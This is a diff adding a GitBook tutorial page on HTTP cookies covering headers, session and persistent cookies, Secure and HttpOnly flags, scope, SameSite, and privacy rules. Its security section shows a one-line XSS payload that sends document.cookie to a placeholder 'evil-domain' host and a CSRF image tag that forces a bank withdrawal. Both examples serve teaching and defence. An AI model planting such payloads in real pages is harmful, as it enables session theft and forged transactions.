@@ -1,0 +1,427 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Cookies · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.2">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="Cookie_MOdule.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Docs
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Routes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Static
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3" data-path="Cookie.html">
+            
+                <a href="Cookie.html">
+            
+                    
+                    Cookies
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="Cookie_MOdule.html">
+            
+                <a href="Cookie_MOdule.html">
+            
+                    
+                    Cookie Module
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="Cookie_Management_in_Express.html">
+            
+                <a href="Cookie_Management_in_Express.html">
+            
+                    
+                    Express and cookies
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="Query_String.html">
+            
+                <a href="Query_String.html">
+            
+                    
+                    Query String
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >Cookies</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="cookies">Cookies</h1>
+<h2 id="what-is-a-cookie">What is a cookie?</h2>
+<blockquote>
+<p><strong>An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user&apos;s web browser, that may store it and send it back together with the next request to the same server. Typically, it&apos;s used to know if two requests came from the same browser allowing to keep a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.</strong></p>
+</blockquote>
+<p>Cookies are mainly used for these three purposes:</p>
+<ul>
+<li>Session management </li>
+<li><ul>
+<li>Personalization</li>
+</ul>
+</li>
+<li>Tracking </li>
+</ul>
+<p>Cookies have also been used for general client-side storage. While this use could have been considered legitimate at a time when there was no other way to store data on the client side, it is no longer the case nowadays where web browsers are capable of using various storage APIs. Since cookies are sent along with every request, it can be an additional performance burden.</p>
+<h2 id="creating-cookies">Creating Cookies</h2>
+<p>When receiving an HTTP request, a server can send a <strong>Set-Cookie</strong> header with the response. The cookie is usually stored by the browser and, afterwards, the cookie value is sent along with every request made to the same server as the content of a Cookie HTTP header. Additionally, an expiration delay can be specified as well as restrictions to a specific domain and path, limiting how long and to which site the cookie is sent to.</p>
+<h2 id="the-set-cookie-and-cookie-headers">The Set-Cookie and Cookie headers</h2>
+<p>The Set-Cookie HTTP response header is used to send cookies from the server to the user agent. A simple cookie can be set like this:</p>
+<blockquote>
+<p>Set-Cookie: &lt; cookie-name&gt;=&lt; cookie-value&gt;</p>
+</blockquote>
+<p>The server tells the client to store a cookie. The response sent to the browser will contain the Set-Cookie header and the browser will store the cookie.</p>
+<blockquote>
+<p>HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+[page content]</p>
+</blockquote>
+<p>Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header.</p>
+<blockquote>
+<p>GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry</p>
+</blockquote>
+<h3 id="session-cookies">Session cookies</h3>
+<p>The simple cookie created above is a <em>session cookie</em>: It will get removed when the client is shut down, they last only for the duration of the session. They don&apos;t specify any Expires or Max-Age directives. </p>
+<h3 id="permanent-cookies">Permanent cookies</h3>
+<p>Instead of expiring when the client is closed, <em>permanent cookies</em> expire at a specific date (Expires) or after a specific length of time (Max-Age).</p>
+<blockquote>
+<p>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</p>
+</blockquote>
+<h3 id="secure-and-httponly-cookies">Secure and HttpOnly cookies</h3>
+<p>A secure cookie will only be sent to the server when a request is made using SSL and the HTTPS protocol. However, note that confidential or sensitive information should never be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure and this flag won&apos;t offer you any additional encryption or security. </p>
+<p>To prevent cross-site scripting (XSS) attacks, HTTP-only cookies aren&apos;t accessible via JavaScript through the Document.cookie property, the XMLHttpRequest and Request APIs. Set this flag when you don&apos;t need your cookies available in JavaScript. </p>
+<blockquote>
+<p>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</p>
+</blockquote>
+<h3 id="scope-of-cookies">Scope of cookies</h3>
+<p>The Domain and Path directives define the scope of the cookie, that is the set of URLs the cookies should be sent back to.</p>
+<p>Domain specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). If a domain is specified, subdomains are always included.</p>
+<p>If Domain=mozilla.org is set, cookies are included on subdomains like developer.mozilla.org.</p>
+<p>Path indicates a URL path that must exist in the requested resource before sending the Cookie header.</p>
+<p>If Path=/docs is set, these paths will all be matched:</p>
+<ul>
+<li>&quot;/docs&quot;,</li>
+<li>&quot;/docs/Web/&quot;,</li>
+<li>&quot;/docs/Web/HTTP&quot;<h3 id="samesite-cookies">SameSite cookies</h3>
+SameSite cookies allow servers to assert that a cookie ought not to be sent along with cross-site requests, which provides some protection against cross-site request forgery attacks (CSRF). </li>
+</ul>
+<h3 id="javascript-access-using-documentcookies">JavaScript access using Document.cookies</h3>
+<p>New cookies can also be created using the <strong>Document.cookie</strong> property, and if the HttpOnly flag is not set, existing cookies can be accessed from JavaScript as well.</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&quot;yummy_cookie=choco&quot;</span>; 
+<span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&quot;tasty_cookie=strawberry&quot;</span>; 
+<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">document</span>.cookie); 
+<span class="hljs-comment">// logs &quot;yummy_cookie=choco; tasty_cookie=strawberry&quot;</span>
+</code></pre>
+<h2 id="security">Security</h2>
+<h3 id="session-hijacking-and-xss">Session hijacking and XSS</h3>
+<p>Cookies are often used in web application to identify a user and their authenticated session. So stealing a cookie from a web application can lead to hijacking the authenticated user&apos;s session. Common ways to steal cookies include using Social Engineering or by exploiting an <em>XSS</em> vulnerability in the application.</p>
+<pre><code class="lang-javascript">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;
+</code></pre>
+<p>The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.</p>
+<h3 id="cross-site-request-forgery-csrf">Cross-site request forgery (CSRF)</h3>
+<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery" target="_blank">Wikipedia</a> mentions a good example for <em>CSRF</em>. In this situation, someone includes an image that isn&#x2019;t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank&#x2019;s server to withdraw money:</p>
+<pre><code class="lang-javascript">&lt;img src=<span class="hljs-string">&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;</span>&gt;
+</code></pre>
+<p>Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:</p>
+<ul>
+<li>As with XSS, input filtering is important.</li>
+<li>There should always be a confirmation required for any sensitive action.</li>
+<li>Cookies that are used for sensitive actions should have a short lifetime only.</li>
+<li>For more prevention tips, see the OWASP CSRF prevention cheat sheet.</li>
+</ul>
+<h2 id="tracking-and-privacy">Tracking and privacy</h2>
+<h3 id="third-party-cookies">Third-party cookies</h3>
+<p>Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a first-party cookie. If the domain is different, it is said to be a third-party cookie. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. </p>
+<h3 id="do-not-track">Do-Not-Track</h3>
+<p>There are no legal or technological requirements for its use, but the DNT header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. </p>
+<h3 id="eu-cookie-directive">EU cookie directive</h3>
+<p>Requirements for cookies across the EU are defined in <a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136" target="_blank">Directive 2009/136/EC</a> of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
+In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners since then to inform the user about the use of cookies.</p>
+<h3 id="zombie-cookies-and-evercookies">Zombie cookies and Evercookies</h3>
+<p>A more radical approach to cookies are zombie cookies or &quot;Evercookies&quot; which are recreated after their deletion and are intentionally hard to delete forever. They are using the <em>Web storage API</em>, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie&apos;s absence is detected.</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Static">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="Cookie_MOdule.html" class="navigation navigation-next " aria-label="Next page: Cookie Module">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Cookies","level":"1.3","depth":1,"next":{"title":"Cookie Module","level":"1.3.1","depth":2,"path":"Cookie_MOdule.md","ref":"Cookie_MOdule.md","articles":[]},"previous":{"title":"Static","level":"1.2.2","depth":2,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"root":"./docs","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Cookie.md","mtime":"2017-03-13T22:05:05.027Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-14T17:11:54.452Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
